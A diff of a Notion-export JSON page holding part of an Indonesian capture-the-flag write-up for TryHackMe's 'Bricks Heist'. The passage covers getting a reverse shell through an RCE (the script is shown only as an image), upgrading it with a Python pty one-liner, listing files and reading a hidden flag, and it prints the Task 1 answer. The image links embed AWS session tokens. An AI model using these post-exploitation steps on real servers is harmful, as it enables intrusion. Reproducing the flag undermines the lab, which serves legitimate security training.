+          "originalUrl": "https://prod-files-secure.s3.us-west-2.amazonaws.com/25667693-cef6-45e6-a695-79b59f50105b/f24f1714-ad10-4edd-b3fc-e2eafa6baa9a/image.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=ASIAZI2LB4664NG6MKMV%2F20250918%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250918T125334Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEEQaCXVzLXdlc3QtMiJHMEUCIF65DRob0eolanpyNhguBY%2FLmvn%2BiJ5Bcq5M0Z7Aa1MCAiEAkJZH6e8AM0%2FNyCdtezV3fOP22l%2FQaawj4p6vTjLQYKoqiAQIvf%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARAAGgw2Mzc0MjMxODM4MDUiDKNM7RuF8DZJcf2%2BKircA4tW94vARYZMSpRWJkUmbHaoPouM8OOnGg5d4tOj9EIdRDUMN2Jw8qBlqJqA3Z%2BRS9wxVTAKurp0a8c2CKhOwWORk2I3VANWGvO52f5sJwE%2FJbbdUD5m8W23j%2BJ5vbinKjQBAuMCkwmsO1BdQ%2F7xaVVBR7CwOlhVGHoyj7duGrJ2%2Ff0XFr%2Fu54dDS%2Bb%2BMneDQYxV9xmg1u5BXJrBV6sLu9wrrpUombGkVLJ3uwrbjXZlQTj5PbwPI0mOGMOAGhUCARlR%2B0RX0tTek7rFcwLcHGUBhJ2Wh%2B%2FYoa66O8TfO%2F2rgCV2BHtCpkQnoQm7ruQKEDLDnvcS3DiU%2FAXUVBBxMKGvLxuon9b6ig9D%2F%2Bf415Nx7ezMmHdGlseFENNJwuCDvIuFO323rHTku7hwikBJMHopdsiy60rVvvxTOuYiSFmicbKXrsqPhAPLPM%2BMMHk15irD5ANRoYCioEG%2B9KkYqll6EAQBNzAHAKaHXZS8CdyzZ3yJkaECvZI7f7mdyIXDTkmLi4v%2FJxhVm7IrfbXIfOt7%2BGv58pXn%2FdRxodIr7TRmLM4eCEUI1XKNz%2F71ma%2FLr5cgKMpOxSji6ppUAE9Ytv2f9LkdXoedCKsbNz1Qu1UZFPnMRSpebmhhb20YMKnkr8YGOqUBj6DGGzJ%2FE%2FaImJnYky3T5HxGUeeNgJbC5RuiubkiK%2FqJ84eBJiaI8Lc8d5A5CMtv%2BAXIhSUb%2B120W5WjMLUpJRUa2KyOWO49mBJuypfgGI2V7hlKEpLcUE%2FO4gEviLmJTS1l0Quw8KIUx%2FKKrtAifOFsk62v%2FHguFySCySVVPCqz8J7M8PyvtELMdKMPsoZ7VmbXD2qAc6D7mVvHfrnjEa%2Ba%2B6qp&X-Amz-Signature=c4191eec1034608842e3536c1d7654386838d0ed3f1c7ee0b6fa1a3a31e42799&X-Amz-SignedHeaders=host&x-amz-checksum-mode=ENABLED&x-id=GetObject"
+        }
+      },
+      {
+        "id": "24bdb469-a81d-80b7-8a3c-c0acde224913",
+        "type": "paragraph",
+        "created_time": "2025-08-10T02:52:00.000Z",
+        "last_edited_time": "2025-08-10T02:52:00.000Z",
+        "has_children": false,
+        "archived": false,
+        "content": {
+          "rich_text": [],
+          "color": "default"
+        }
+      },
+      {
+        "id": "24bdb469-a81d-80c2-bd14-de64eaa5232f",
+        "type": "paragraph",
+        "created_time": "2025-08-10T02:42:00.000Z",
+        "last_edited_time": "2025-08-10T02:53:00.000Z",
+        "has_children": false,
+        "archived": false,
+        "content": {
+          "rich_text": [
+            {
+              "content": "Setelah itu, copy dan paste script reverse shell nya di RCE tadi:",
+              "annotations": {
+                "bold": false,
+                "italic": false,
+                "strikethrough": false,
+                "underline": false,
+                "code": false,
+                "color": "default"
+              },
+              "href": null
+            }
+          ],
+          "color": "default"
+        }
+      },
+      {
+        "id": "24bdb469-a81d-808f-a460-f3870b58ce43",
+        "type": "image",
+        "created_time": "2025-08-10T02:53:00.000Z",
+        "last_edited_time": "2025-08-10T02:53:00.000Z",
+        "has_children": false,
+        "archived": false,
+        "content": {
+          "caption": [],
+          "type": "file",
+          "url": "/posts/tryhack3m-bricks-heist-24adb469a81d807eb9ddc92c2292fde2/image-12.png",
+          "expiry_time": "2025-09-18T13:53:33.995Z",
+          "localUrl": "/posts/tryhack3m-bricks-heist-24adb469a81d807eb9ddc92c2292fde2/image-12.png",
+          "originalUrl": "https://prod-files-secure.s3.us-west-2.amazonaws.com/25667693-cef6-45e6-a695-79b59f50105b/3bf3d2bd-242a-4a09-af59-3592174046fc/image.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=ASIAZI2LB4664NG6MKMV%2F20250918%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250918T125334Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEEQaCXVzLXdlc3QtMiJHMEUCIF65DRob0eolanpyNhguBY%2FLmvn%2BiJ5Bcq5M0Z7Aa1MCAiEAkJZH6e8AM0%2FNyCdtezV3fOP22l%2FQaawj4p6vTjLQYKoqiAQIvf%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARAAGgw2Mzc0MjMxODM4MDUiDKNM7RuF8DZJcf2%2BKircA4tW94vARYZMSpRWJkUmbHaoPouM8OOnGg5d4tOj9EIdRDUMN2Jw8qBlqJqA3Z%2BRS9wxVTAKurp0a8c2CKhOwWORk2I3VANWGvO52f5sJwE%2FJbbdUD5m8W23j%2BJ5vbinKjQBAuMCkwmsO1BdQ%2F7xaVVBR7CwOlhVGHoyj7duGrJ2%2Ff0XFr%2Fu54dDS%2Bb%2BMneDQYxV9xmg1u5BXJrBV6sLu9wrrpUombGkVLJ3uwrbjXZlQTj5PbwPI0mOGMOAGhUCARlR%2B0RX0tTek7rFcwLcHGUBhJ2Wh%2B%2FYoa66O8TfO%2F2rgCV2BHtCpkQnoQm7ruQKEDLDnvcS3DiU%2FAXUVBBxMKGvLxuon9b6ig9D%2F%2Bf415Nx7ezMmHdGlseFENNJwuCDvIuFO323rHTku7hwikBJMHopdsiy60rVvvxTOuYiSFmicbKXrsqPhAPLPM%2BMMHk15irD5ANRoYCioEG%2B9KkYqll6EAQBNzAHAKaHXZS8CdyzZ3yJkaECvZI7f7mdyIXDTkmLi4v%2FJxhVm7IrfbXIfOt7%2BGv58pXn%2FdRxodIr7TRmLM4eCEUI1XKNz%2F71ma%2FLr5cgKMpOxSji6ppUAE9Ytv2f9LkdXoedCKsbNz1Qu1UZFPnMRSpebmhhb20YMKnkr8YGOqUBj6DGGzJ%2FE%2FaImJnYky3T5HxGUeeNgJbC5RuiubkiK%2FqJ84eBJiaI8Lc8d5A5CMtv%2BAXIhSUb%2B120W5WjMLUpJRUa2KyOWO49mBJuypfgGI2V7hlKEpLcUE%2FO4gEviLmJTS1l0Quw8KIUx%2FKKrtAifOFsk62v%2FHguFySCySVVPCqz8J7M8PyvtELMdKMPsoZ7VmbXD2qAc6D7mVvHfrnjEa%2Ba%2B6qp&X-Amz-Signature=0b00b8d420651a3310aa5736f9d381b22819d53f0bea066defb66df3e6a810a4&X-Amz-SignedHeaders=host&x-amz-checksum-mode=ENABLED&x-id=GetObject"
+        }
+      },
+      {
+        "id": "24bdb469-a81d-8042-b03d-c219bf668dd0",
+        "type": "paragraph",
+        "created_time": "2025-08-10T02:53:00.000Z",
+        "last_edited_time": "2025-08-10T02:53:00.000Z",
+        "has_children": false,
+        "archived": false,
+        "content": {
+          "rich_text": [],
+          "color": "default"
+        }
+      },
+      {
+        "id": "24bdb469-a81d-8076-b312-fe0d41652da8",
+        "type": "paragraph",
+        "created_time": "2025-08-10T02:53:00.000Z",
+        "last_edited_time": "2025-08-10T02:53:00.000Z",
+        "has_children": false,
+        "archived": false,
+        "content": {
+          "rich_text": [
+            {
+              "content": "Apabila berhasil, maka tampilan nya akan seperti ini:",
+              "annotations": {
+                "bold": false,
+                "italic": false,
+                "strikethrough": false,
+                "underline": false,
+                "code": false,
+                "color": "default"
+              },
+              "href": null
+            }
+          ],
+          "color": "default"
+        }
+      },
+      {
+        "id": "24bdb469-a81d-805f-a6ed-f7ad2a5bd9b9",
+        "type": "image",
+        "created_time": "2025-08-10T02:53:00.000Z",
+        "last_edited_time": "2025-09-18T09:43:00.000Z",
+        "has_children": false,
+        "archived": false,
+        "content": {
+          "caption": [],
+          "type": "file",
+          "url": "/posts/tryhack3m-bricks-heist-24adb469a81d807eb9ddc92c2292fde2/image-13.png",
+          "expiry_time": "2025-09-18T13:53:34.200Z",
+          "localUrl": "/posts/tryhack3m-bricks-heist-24adb469a81d807eb9ddc92c2292fde2/image-13.png",
+          "originalUrl": "https://prod-files-secure.s3.us-west-2.amazonaws.com/25667693-cef6-45e6-a695-79b59f50105b/be5b1cb3-743f-4de2-b9ac-2f2de21d9e5a/image.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=ASIAZI2LB4664NG6MKMV%2F20250918%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250918T125334Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEEQaCXVzLXdlc3QtMiJHMEUCIF65DRob0eolanpyNhguBY%2FLmvn%2BiJ5Bcq5M0Z7Aa1MCAiEAkJZH6e8AM0%2FNyCdtezV3fOP22l%2FQaawj4p6vTjLQYKoqiAQIvf%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARAAGgw2Mzc0MjMxODM4MDUiDKNM7RuF8DZJcf2%2BKircA4tW94vARYZMSpRWJkUmbHaoPouM8OOnGg5d4tOj9EIdRDUMN2Jw8qBlqJqA3Z%2BRS9wxVTAKurp0a8c2CKhOwWORk2I3VANWGvO52f5sJwE%2FJbbdUD5m8W23j%2BJ5vbinKjQBAuMCkwmsO1BdQ%2F7xaVVBR7CwOlhVGHoyj7duGrJ2%2Ff0XFr%2Fu54dDS%2Bb%2BMneDQYxV9xmg1u5BXJrBV6sLu9wrrpUombGkVLJ3uwrbjXZlQTj5PbwPI0mOGMOAGhUCARlR%2B0RX0tTek7rFcwLcHGUBhJ2Wh%2B%2FYoa66O8TfO%2F2rgCV2BHtCpkQnoQm7ruQKEDLDnvcS3DiU%2FAXUVBBxMKGvLxuon9b6ig9D%2F%2Bf415Nx7ezMmHdGlseFENNJwuCDvIuFO323rHTku7hwikBJMHopdsiy60rVvvxTOuYiSFmicbKXrsqPhAPLPM%2BMMHk15irD5ANRoYCioEG%2B9KkYqll6EAQBNzAHAKaHXZS8CdyzZ3yJkaECvZI7f7mdyIXDTkmLi4v%2FJxhVm7IrfbXIfOt7%2BGv58pXn%2FdRxodIr7TRmLM4eCEUI1XKNz%2F71ma%2FLr5cgKMpOxSji6ppUAE9Ytv2f9LkdXoedCKsbNz1Qu1UZFPnMRSpebmhhb20YMKnkr8YGOqUBj6DGGzJ%2FE%2FaImJnYky3T5HxGUeeNgJbC5RuiubkiK%2FqJ84eBJiaI8Lc8d5A5CMtv%2BAXIhSUb%2B120W5WjMLUpJRUa2KyOWO49mBJuypfgGI2V7hlKEpLcUE%2FO4gEviLmJTS1l0Quw8KIUx%2FKKrtAifOFsk62v%2FHguFySCySVVPCqz8J7M8PyvtELMdKMPsoZ7VmbXD2qAc6D7mVvHfrnjEa%2Ba%2B6qp&X-Amz-Signature=e2a9ca7a88f5ae231c9c1313328e584437af972f21aa7bd439c7357e4a6e6c37&X-Amz-SignedHeaders=host&x-amz-checksum-mode=ENABLED&x-id=GetObject"
+        }
+      },
+      {
+        "id": "24bdb469-a81d-8023-b03c-ef4805270318",
+        "type": "paragraph",
+        "created_time": "2025-08-10T02:56:00.000Z",
+        "last_edited_time": "2025-08-10T02:56:00.000Z",
+        "has_children": false,
+        "archived": false,
+        "content": {
+          "rich_text": [
+            {
+              "content": "Biar tampilan nya lebih enak dilihat, kita paste script berikut:",
+              "annotations": {
+                "bold": false,
+                "italic": false,
+                "strikethrough": false,
+                "underline": false,
+                "code": false,
+                "color": "default"
+              },
+              "href": null
+            }
+          ],
+          "color": "default"
+        }
+      },
+      {
+        "id": "24bdb469-a81d-804b-ac20-ebfe8dd0bcb8",
+        "type": "code",
+        "created_time": "2025-08-10T02:56:00.000Z",
+        "last_edited_time": "2025-08-10T02:56:00.000Z",
+        "has_children": false,
+        "archived": false,
+        "content": {
+          "rich_text": [
+            {
+              "content": "python3 -c 'import pty; pty.spawn(\"/bin/bash\")'",
+              "annotations": {
+                "bold": false,
+                "italic": false,
+                "strikethrough": false,
+                "underline": false,
+                "code": false,
+                "color": "default"
+              },
+              "href": null
+            }
+          ],
+          "language": "python",
+          "caption": []
+        }
+      },
+      {
+        "id": "24bdb469-a81d-80e7-8271-e44458e43197",
+        "type": "paragraph",
+        "created_time": "2025-08-10T02:56:00.000Z",
+        "last_edited_time": "2025-08-10T02:56:00.000Z",
+        "has_children": false,
+        "archived": false,
+        "content": {
+          "rich_text": [],
+          "color": "default"
+        }
+      },
+      {
+        "id": "24bdb469-a81d-8087-95a5-cb24b0c91857",
+        "type": "image",
+        "created_time": "2025-08-10T02:56:00.000Z",
+        "last_edited_time": "2025-09-18T09:43:00.000Z",
+        "has_children": false,
+        "archived": false,
+        "content": {
+          "caption": [],
+          "type": "file",
+          "url": "/posts/tryhack3m-bricks-heist-24adb469a81d807eb9ddc92c2292fde2/image-14.png",
+          "expiry_time": "2025-09-18T13:53:34.198Z",
+          "localUrl": "/posts/tryhack3m-bricks-heist-24adb469a81d807eb9ddc92c2292fde2/image-14.png",
+          "originalUrl": "https://prod-files-secure.s3.us-west-2.amazonaws.com/25667693-cef6-45e6-a695-79b59f50105b/bb3ca919-e994-4de5-b4f7-4275112d7de0/image.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=ASIAZI2LB4664NG6MKMV%2F20250918%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250918T125334Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEEQaCXVzLXdlc3QtMiJHMEUCIF65DRob0eolanpyNhguBY%2FLmvn%2BiJ5Bcq5M0Z7Aa1MCAiEAkJZH6e8AM0%2FNyCdtezV3fOP22l%2FQaawj4p6vTjLQYKoqiAQIvf%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARAAGgw2Mzc0MjMxODM4MDUiDKNM7RuF8DZJcf2%2BKircA4tW94vARYZMSpRWJkUmbHaoPouM8OOnGg5d4tOj9EIdRDUMN2Jw8qBlqJqA3Z%2BRS9wxVTAKurp0a8c2CKhOwWORk2I3VANWGvO52f5sJwE%2FJbbdUD5m8W23j%2BJ5vbinKjQBAuMCkwmsO1BdQ%2F7xaVVBR7CwOlhVGHoyj7duGrJ2%2Ff0XFr%2Fu54dDS%2Bb%2BMneDQYxV9xmg1u5BXJrBV6sLu9wrrpUombGkVLJ3uwrbjXZlQTj5PbwPI0mOGMOAGhUCARlR%2B0RX0tTek7rFcwLcHGUBhJ2Wh%2B%2FYoa66O8TfO%2F2rgCV2BHtCpkQnoQm7ruQKEDLDnvcS3DiU%2FAXUVBBxMKGvLxuon9b6ig9D%2F%2Bf415Nx7ezMmHdGlseFENNJwuCDvIuFO323rHTku7hwikBJMHopdsiy60rVvvxTOuYiSFmicbKXrsqPhAPLPM%2BMMHk15irD5ANRoYCioEG%2B9KkYqll6EAQBNzAHAKaHXZS8CdyzZ3yJkaECvZI7f7mdyIXDTkmLi4v%2FJxhVm7IrfbXIfOt7%2BGv58pXn%2FdRxodIr7TRmLM4eCEUI1XKNz%2F71ma%2FLr5cgKMpOxSji6ppUAE9Ytv2f9LkdXoedCKsbNz1Qu1UZFPnMRSpebmhhb20YMKnkr8YGOqUBj6DGGzJ%2FE%2FaImJnYky3T5HxGUeeNgJbC5RuiubkiK%2FqJ84eBJiaI8Lc8d5A5CMtv%2BAXIhSUb%2B120W5WjMLUpJRUa2KyOWO49mBJuypfgGI2V7hlKEpLcUE%2FO4gEviLmJTS1l0Quw8KIUx%2FKKrtAifOFsk62v%2FHguFySCySVVPCqz8J7M8PyvtELMdKMPsoZ7VmbXD2qAc6D7mVvHfrnjEa%2Ba%2B6qp&X-Amz-Signature=bfc201cecd6e1e3c527ab818835bf09e11bc531318dfa5ed36937e610e9fd680&X-Amz-SignedHeaders=host&x-amz-checksum-mode=ENABLED&x-id=GetObject"
+        }
+      },
+      {
+        "id": "24bdb469-a81d-80b8-994d-db67471a52ba",
+        "type": "paragraph",
+        "created_time": "2025-08-10T02:56:00.000Z",
+        "last_edited_time": "2025-08-10T02:56:00.000Z",
+        "has_children": false,
+        "archived": false,
+        "content": {
+          "rich_text": [],
+          "color": "default"
+        }
+      },
+      {
+        "id": "24bdb469-a81d-805b-b3ee-e05a05e48511",
+        "type": "heading_2",
+        "created_time": "2025-08-10T02:42:00.000Z",
+        "last_edited_time": "2025-08-10T02:43:00.000Z",
+        "has_children": false,
+        "archived": false,
+        "content": {
+          "rich_text": [
+            {
+              "content": "Task 1",
+              "annotations": {
+                "bold": false,
+                "italic": false,
+                "strikethrough": false,
+                "underline": false,
+                "code": false,
+                "color": "default"
+              },
+              "href": null
+            }
+          ],
+          "color": "default",
+          "is_toggleable": false
+        }
+      },
+      {
+        "id": "24bdb469-a81d-8062-8aed-f09b856631d2",
+        "type": "heading_3",
+        "created_time": "2025-08-10T02:43:00.000Z",
+        "last_edited_time": "2025-08-10T02:43:00.000Z",
+        "has_children": false,
+        "archived": false,
+        "content": {
+          "rich_text": [
+            {
+              "content": "1. What is the content of the hidden .txt file in the web folder?",
+              "annotations": {
+                "bold": false,
+                "italic": false,
+                "strikethrough": false,
+                "underline": false,
+                "code": false,
+                "color": "default"
+              },
+              "href": null
+            }
+          ],
+          "color": "default",
+          "is_toggleable": false
+        }
+      },
+      {
+        "id": "24bdb469-a81d-80a1-ac87-f62ade998658",
+        "type": "paragraph",
+        "created_time": "2025-08-10T02:43:00.000Z",
+        "last_edited_time": "2025-08-10T02:44:00.000Z",
+        "has_children": false,
+        "archived": false,
+        "content": {
+          "rich_text": [
+            {
+              "content": "Di soal pertama, kita harus mengetahui isi dari file .txt yang ada di web folder. Untuk menjawab nya cukup mudah, karna kita sudah masuk ke dalam server nya.",
+              "annotations": {
+                "bold": false,
+                "italic": false,
+                "strikethrough": false,
+                "underline": false,
+                "code": false,
+                "color": "default"
+              },
+              "href": null
+            }
+          ],
+          "color": "default"
+        }
+      },
+      {
+        "id": "24bdb469-a81d-8046-843f-e6b6c65b4e03",
+        "type": "paragraph",
+        "created_time": "2025-08-10T02:49:00.000Z",
+        "last_edited_time": "2025-08-10T02:54:00.000Z",
+        "has_children": false,
+        "archived": false,
+        "content": {
+          "rich_text": [
+            {
+              "content": "Langsung saja ketik ‘ls -la’",
+              "annotations": {
+                "bold": false,
+                "italic": false,
+                "strikethrough": false,
+                "underline": false,
+                "code": false,
+                "color": "default"
+              },
+              "href": null
+            }
+          ],
+          "color": "default"
+        }
+      },
+      {
+        "id": "24bdb469-a81d-8034-926a-df12980284b5",
+        "type": "paragraph",
+        "created_time": "2025-08-10T02:54:00.000Z",
+        "last_edited_time": "2025-08-10T02:54:00.000Z",
+        "has_children": false,
+        "archived": false,
+        "content": {
+          "rich_text": [],
+          "color": "default"
+        }
+      },
+      {
+        "id": "24bdb469-a81d-80da-a225-e060a0cf1984",
+        "type": "image",
+        "created_time": "2025-08-10T02:57:00.000Z",
+        "last_edited_time": "2025-09-18T09:43:00.000Z",
+        "has_children": false,
+        "archived": false,
+        "content": {
+          "caption": [],
+          "type": "file",
+          "url": "/posts/tryhack3m-bricks-heist-24adb469a81d807eb9ddc92c2292fde2/image-15.png",
+          "expiry_time": "2025-09-18T13:53:34.239Z",
+          "localUrl": "/posts/tryhack3m-bricks-heist-24adb469a81d807eb9ddc92c2292fde2/image-15.png",
+          "originalUrl": "https://prod-files-secure.s3.us-west-2.amazonaws.com/25667693-cef6-45e6-a695-79b59f50105b/86f5ce22-1f9f-4042-8f02-f033a83eec61/image.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=ASIAZI2LB4664NG6MKMV%2F20250918%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250918T125334Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEEQaCXVzLXdlc3QtMiJHMEUCIF65DRob0eolanpyNhguBY%2FLmvn%2BiJ5Bcq5M0Z7Aa1MCAiEAkJZH6e8AM0%2FNyCdtezV3fOP22l%2FQaawj4p6vTjLQYKoqiAQIvf%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARAAGgw2Mzc0MjMxODM4MDUiDKNM7RuF8DZJcf2%2BKircA4tW94vARYZMSpRWJkUmbHaoPouM8OOnGg5d4tOj9EIdRDUMN2Jw8qBlqJqA3Z%2BRS9wxVTAKurp0a8c2CKhOwWORk2I3VANWGvO52f5sJwE%2FJbbdUD5m8W23j%2BJ5vbinKjQBAuMCkwmsO1BdQ%2F7xaVVBR7CwOlhVGHoyj7duGrJ2%2Ff0XFr%2Fu54dDS%2Bb%2BMneDQYxV9xmg1u5BXJrBV6sLu9wrrpUombGkVLJ3uwrbjXZlQTj5PbwPI0mOGMOAGhUCARlR%2B0RX0tTek7rFcwLcHGUBhJ2Wh%2B%2FYoa66O8TfO%2F2rgCV2BHtCpkQnoQm7ruQKEDLDnvcS3DiU%2FAXUVBBxMKGvLxuon9b6ig9D%2F%2Bf415Nx7ezMmHdGlseFENNJwuCDvIuFO323rHTku7hwikBJMHopdsiy60rVvvxTOuYiSFmicbKXrsqPhAPLPM%2BMMHk15irD5ANRoYCioEG%2B9KkYqll6EAQBNzAHAKaHXZS8CdyzZ3yJkaECvZI7f7mdyIXDTkmLi4v%2FJxhVm7IrfbXIfOt7%2BGv58pXn%2FdRxodIr7TRmLM4eCEUI1XKNz%2F71ma%2FLr5cgKMpOxSji6ppUAE9Ytv2f9LkdXoedCKsbNz1Qu1UZFPnMRSpebmhhb20YMKnkr8YGOqUBj6DGGzJ%2FE%2FaImJnYky3T5HxGUeeNgJbC5RuiubkiK%2FqJ84eBJiaI8Lc8d5A5CMtv%2BAXIhSUb%2B120W5WjMLUpJRUa2KyOWO49mBJuypfgGI2V7hlKEpLcUE%2FO4gEviLmJTS1l0Quw8KIUx%2FKKrtAifOFsk62v%2FHguFySCySVVPCqz8J7M8PyvtELMdKMPsoZ7VmbXD2qAc6D7mVvHfrnjEa%2Ba%2B6qp&X-Amz-Signature=069c65ec039f3c9506edfad7d6ef53797d3aea6c7165f311b0693ab82efa6c3f&X-Amz-SignedHeaders=host&x-amz-checksum-mode=ENABLED&x-id=GetObject"
+        }
+      },
+      {
+        "id": "24bdb469-a81d-80ed-a664-de64d6656940",
+        "type": "paragraph",
+        "created_time": "2025-08-10T02:57:00.000Z",
+        "last_edited_time": "2025-08-10T02:57:00.000Z",
+        "has_children": false,
+        "archived": false,
+        "content": {
+          "rich_text": [],
+          "color": "default"
+        }
+      },
+      {
+        "id": "24bdb469-a81d-801d-8b6a-f4d754436a08",
+        "type": "paragraph",
+        "created_time": "2025-08-10T02:57:00.000Z",
+        "last_edited_time": "2025-08-10T02:57:00.000Z",
+        "has_children": false,
+        "archived": false,
+        "content": {
+          "rich_text": [
+            {
+              "content": "Terlihat ada file .txt, langsung saja kita lihat dengan perintah “cat 650c844110baced87e1606453b93f22a.txt”",
+              "annotations": {
+                "bold": false,
+                "italic": false,
+                "strikethrough": false,
+                "underline": false,
+                "code": false,
+                "color": "default"
+              },
+              "href": null
+            }
+          ],
+          "color": "default"
+        }
+      },
+      {
+        "id": "24bdb469-a81d-80da-ab94-ff75a8ebb9ce",
+        "type": "image",
+        "created_time": "2025-08-10T02:57:00.000Z",
+        "last_edited_time": "2025-09-18T09:43:00.000Z",
+        "has_children": false,
+        "archived": false,
+        "content": {
+          "caption": [],
+          "type": "file",
+          "url": "/posts/tryhack3m-bricks-heist-24adb469a81d807eb9ddc92c2292fde2/image-16.png",
+          "expiry_time": "2025-09-18T13:53:34.204Z",
+          "localUrl": "/posts/tryhack3m-bricks-heist-24adb469a81d807eb9ddc92c2292fde2/image-16.png",
+          "originalUrl": "https://prod-files-secure.s3.us-west-2.amazonaws.com/25667693-cef6-45e6-a695-79b59f50105b/39d200ae-f5e7-41d0-af51-cae940d3155c/image.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=ASIAZI2LB4664NG6MKMV%2F20250918%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250918T125334Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEEQaCXVzLXdlc3QtMiJHMEUCIF65DRob0eolanpyNhguBY%2FLmvn%2BiJ5Bcq5M0Z7Aa1MCAiEAkJZH6e8AM0%2FNyCdtezV3fOP22l%2FQaawj4p6vTjLQYKoqiAQIvf%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARAAGgw2Mzc0MjMxODM4MDUiDKNM7RuF8DZJcf2%2BKircA4tW94vARYZMSpRWJkUmbHaoPouM8OOnGg5d4tOj9EIdRDUMN2Jw8qBlqJqA3Z%2BRS9wxVTAKurp0a8c2CKhOwWORk2I3VANWGvO52f5sJwE%2FJbbdUD5m8W23j%2BJ5vbinKjQBAuMCkwmsO1BdQ%2F7xaVVBR7CwOlhVGHoyj7duGrJ2%2Ff0XFr%2Fu54dDS%2Bb%2BMneDQYxV9xmg1u5BXJrBV6sLu9wrrpUombGkVLJ3uwrbjXZlQTj5PbwPI0mOGMOAGhUCARlR%2B0RX0tTek7rFcwLcHGUBhJ2Wh%2B%2FYoa66O8TfO%2F2rgCV2BHtCpkQnoQm7ruQKEDLDnvcS3DiU%2FAXUVBBxMKGvLxuon9b6ig9D%2F%2Bf415Nx7ezMmHdGlseFENNJwuCDvIuFO323rHTku7hwikBJMHopdsiy60rVvvxTOuYiSFmicbKXrsqPhAPLPM%2BMMHk15irD5ANRoYCioEG%2B9KkYqll6EAQBNzAHAKaHXZS8CdyzZ3yJkaECvZI7f7mdyIXDTkmLi4v%2FJxhVm7IrfbXIfOt7%2BGv58pXn%2FdRxodIr7TRmLM4eCEUI1XKNz%2F71ma%2FLr5cgKMpOxSji6ppUAE9Ytv2f9LkdXoedCKsbNz1Qu1UZFPnMRSpebmhhb20YMKnkr8YGOqUBj6DGGzJ%2FE%2FaImJnYky3T5HxGUeeNgJbC5RuiubkiK%2FqJ84eBJiaI8Lc8d5A5CMtv%2BAXIhSUb%2B120W5WjMLUpJRUa2KyOWO49mBJuypfgGI2V7hlKEpLcUE%2FO4gEviLmJTS1l0Quw8KIUx%2FKKrtAifOFsk62v%2FHguFySCySVVPCqz8J7M8PyvtELMdKMPsoZ7VmbXD2qAc6D7mVvHfrnjEa%2Ba%2B6qp&X-Amz-Signature=519a55dcafe65522f7fbd2c53508744aa14b24c45ae9614bb8ffe37b1b622b25&X-Amz-SignedHeaders=host&x-amz-checksum-mode=ENABLED&x-id=GetObject"
+        }
+      },
+      {
+        "id": "24bdb469-a81d-805d-9be3-cffb774d85c8",
+        "type": "paragraph",
+        "created_time": "2025-08-10T02:57:00.000Z",
+        "last_edited_time": "2025-08-10T02:57:00.000Z",
+        "has_children": false,
+        "archived": false,
+        "content": {
+          "rich_text": [],
+          "color": "default"
+        }
+      },
+      {
+        "id": "24bdb469-a81d-803c-ae94-ee867ad04780",
+        "type": "paragraph",
+        "created_time": "2025-08-10T02:57:00.000Z",
+        "last_edited_time": "2025-08-10T02:58:00.000Z",
+        "has_children": false,
+        "archived": false,
+        "content": {
+          "rich_text": [
+            {
+              "content": "Yups, jawaban soal pertama sudah kita dapatkan 😀",
+              "annotations": {
+                "bold": false,
+                "italic": false,
+                "strikethrough": false,
+                "underline": false,
+                "code": false,
+                "color": "default"
+              },
+              "href": null
+            }
+          ],
+          "color": "default"
+        }
+      },
+      {
+        "id": "24bdb469-a81d-80fa-9d6d-cbdfd1b2dfb3",
+        "type": "paragraph",
+        "created_time": "2025-08-10T02:58:00.000Z",
+        "last_edited_time": "2025-08-10T02:58:00.000Z",
+        "has_children": false,
+        "archived": false,
+        "content": {
+          "rich_text": [
+            {
+              "content": "Answer: THM{fl46_650c844110baced87e1606453b93f22a}\n",
+              "annotations": {
+                "bold": false,
+                "italic": false,
+                "strikethrough": false,
+                "underline": false,
+                "code": false,
+                "color": "default"
+              },
+              "href": null
+            }
+          ],
+          "color": "default"
+        }
+      },
+      {
+        "id": "24bdb469-a81d-8033-a316-e2de9f38a530",
+        "type": "divider",
+        "created_time": "2025-08-10T02:58:00.000Z",
+        "last_edited_time": "2025-08-10T02:58:00.000Z",
+        "has_children": false,
+        "archived": false,
+        "content": {}
+      },
+      {
+        "id": "24bdb469-a81d-80de-ab7f-d7da54cb2b55",
+        "type": "paragraph",
+        "created_time": "2025-08-10T02:58:00.000Z",
+        "last_edited_time": "2025-08-10T02:58:00.000Z",
+        "has_children": false,
+        "archived": false,
+        "content": {
+          "rich_text": [],
+          "color": "default"
+        }
+      },
+      {
+        "id": "24bdb469-a81d-8060-b568-fc859f191b46",
+        "type": "heading_3",
+        "created_time": "2025-08-10T02:58:00.000Z",
+        "last_edited_time": "2025-08-10T03:00:00.000Z",
+        "has_children": false,
+        "archived": false,
+        "content": {
+          "rich_text": [
+            {
+              "content": "2. What is the name of the suspicious process?",
+              "annotations": {
+                "bold": false,
+                "italic": false,
+                "strikethrough": false,
+                "underline": false,
+                "code": false,
